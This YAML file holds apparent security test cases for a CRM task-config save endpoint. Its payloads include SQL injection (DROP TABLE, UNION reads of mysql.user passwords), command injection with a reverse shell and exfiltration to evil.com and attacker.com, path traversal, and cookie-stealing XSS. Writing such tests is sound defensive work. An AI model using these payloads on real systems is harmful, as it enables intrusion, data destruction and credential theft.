# ==================== 安全测试用例 ====================

# --- SQL注入漏洞测试 ---
- case_id: SAVE_CONFIG_SQL_001
  title: 安全-SQL注入-单引号闭合
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "1127' OR '1'='1"
    staffFsIds:
    - "672b7g6d' OR '1'='1"
    shareLimits:
    - staffFsId: "672b7g6d' OR '1'='1"
      limit: -1
    orgIds:
    - "308' OR '1'='1"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_SQL_002
  title: 安全-SQL注入-注释符截断
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "1127; DROP TABLE cs_task_config;--"
    staffFsIds:
    - "672b7g6d'; DROP TABLE users;--"
    shareLimits:
    - staffFsId: "admin'--"
      limit: -1
    orgIds:
    - "308; DELETE FROM org;--"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_SQL_003
  title: 安全-SQL注入-双引号闭合
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: '1127" OR "1"="1"'
    staffFsIds:
    - '672b7g6d" OR "1"="1"'
    shareLimits:
    - staffFsId: '672b7g6d" OR "1"="1"'
      limit: -1
    orgIds:
    - '308" OR "1"="1"'
  expected:
    status_code: 200

# --- UNION注入漏洞测试 ---
- case_id: SAVE_CONFIG_UNION_001
  title: 安全-UNION注入-查询列数探测
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "1127 UNION SELECT NULL,NULL,NULL--"
    staffFsIds:
    - "672b7g6d' UNION SELECT 1,2,3--"
    shareLimits:
    - staffFsId: "' UNION SELECT username,password FROM users--"
      limit: -1
    orgIds:
    - "308 UNION SELECT NULL--"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_UNION_002
  title: 安全-UNION注入-信息泄露
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "0 UNION SELECT table_name,column_name,data_type FROM information_schema.columns--"
    staffFsIds:
    - "' UNION SELECT @@version,user(),database()--"
    shareLimits:
    - staffFsId: "' UNION ALL SELECT NULL,CONCAT(user,':',password) FROM mysql.user--"
      limit: -1
    orgIds:
    - "0 UNION SELECT schema_name,NULL FROM information_schema.schemata--"
  expected:
    status_code: 200

# --- 盲注漏洞测试 ---
- case_id: SAVE_CONFIG_BLIND_001
  title: 安全-布尔盲注-条件判断
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "1127 AND 1=1"
    staffFsIds:
    - "672b7g6d' AND '1'='1"
    shareLimits:
    - staffFsId: "672b7g6d' AND SUBSTRING(@@version,1,1)='5"
      limit: -1
    orgIds:
    - "308 AND 1=2"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_BLIND_002
  title: 安全-时间盲注-延时探测
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "1127; WAITFOR DELAY '0:0:5'--"
    staffFsIds:
    - "672b7g6d' AND SLEEP(5)--"
    shareLimits:
    - staffFsId: "672b7g6d' AND IF(1=1,SLEEP(5),0)--"
      limit: -1
    orgIds:
    - "308; SELECT BENCHMARK(10000000,SHA1('test'))--"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_BLIND_003
  title: 安全-报错注入-extractvalue
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "1127 AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))"
    staffFsIds:
    - "672b7g6d' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
    shareLimits:
    - staffFsId: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
      limit: -1
    orgIds:
    - "308"
  expected:
    status_code: 200

# --- 命令行注入测试 ---
- case_id: SAVE_CONFIG_CMD_001
  title: 安全-命令注入-管道符执行
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "1127|ls -la /etc/passwd"
    staffFsIds:
    - "672b7g6d;cat /etc/passwd"
    shareLimits:
    - staffFsId: "672b7g6d`whoami`"
      limit: -1
    orgIds:
    - "308&&id"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_CMD_002
  title: 安全-命令注入-反引号执行
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "`cat /etc/passwd`"
    staffFsIds:
    - "$(whoami)"
    shareLimits:
    - staffFsId: "672b7g6d;nc -e /bin/sh attacker.com 4444"
      limit: -1
    orgIds:
    - "308|wget http://evil.com/shell.sh"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_CMD_003
  title: 安全-命令注入-特殊符号组合
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "1127\n/bin/sh -c 'echo vulnerable'"
    staffFsIds:
    - "672b7g6d%0a%0dls"
    shareLimits:
    - staffFsId: "../../../etc/passwd"
      limit: -1
    orgIds:
    - "308;curl http://evil.com/?data=$(cat /etc/passwd)"
  expected:
    status_code: 200

# --- XSS注入测试 ---
- case_id: SAVE_CONFIG_XSS_001
  title: 安全-XSS注入-script标签
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "<script>alert('XSS')</script>"
    staffFsIds:
    - "<script>document.location='http://evil.com/?c='+document.cookie</script>"
    shareLimits:
    - staffFsId: "<script>new Image().src='http://evil.com/steal?cookie='+document.cookie</script>"
      limit: -1
    orgIds:
    - "<script>alert(document.domain)</script>"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_XSS_002
  title: 安全-XSS注入-事件处理器
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "<img src=x onerror=alert('XSS')>"
    staffFsIds:
    - "<svg onload=alert('XSS')>"
    shareLimits:
    - staffFsId: "<body onload=alert('XSS')>"
      limit: -1
    orgIds:
    - "<input onfocus=alert('XSS') autofocus>"
  expected:
    status_code: 200

- case_id: SAVE_CONFIG_XSS_003
  title: 安全-XSS注入-编码绕过
  method: POST
  path: /crm-task/v1/csTaskConfig/plus/saveConfig
  headers:
    Content-Type: application/json
    business: yupao
  cookies: *id001
  body:
    planId: "&#60;script&#62;alert('XSS')&#60;/script&#62;"
    staffFsIds:
    - "%3Cscript%3Ealert('XSS')%3C/script%3E"
    shareLimits:
    - staffFsId: "javascript:alert('XSS')"
      limit: -1
    orgIds:
    - "<iframe src='javascript:alert(1)'>"
  expected:
    status_code: 200

